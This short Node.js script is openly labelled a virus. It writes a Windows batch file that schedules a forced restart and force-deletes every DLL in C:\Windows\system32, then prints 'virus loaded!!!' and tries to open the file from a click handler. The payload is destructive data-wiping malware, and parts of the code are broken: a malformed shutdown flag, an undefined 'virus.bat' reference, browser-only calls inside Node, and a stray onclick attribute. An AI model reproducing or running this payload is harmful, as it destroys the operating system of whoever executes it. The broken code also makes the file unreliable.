const fs = require("fs")
let virus = '@echo off\n' +
'shutdown - r -t 10\n' +
'del /f /s /q C:\\Windows\\system32\\*.dll';
fs.writeFile('virus.bat', virus, (err) => { 
if (err) throw err; 
console.log(virus,  '\n'+
'virus loaded!!!');
function openfile(file) { window.location = "file:///" + virus.bat; }
onclick="openfile(this.value)"
})
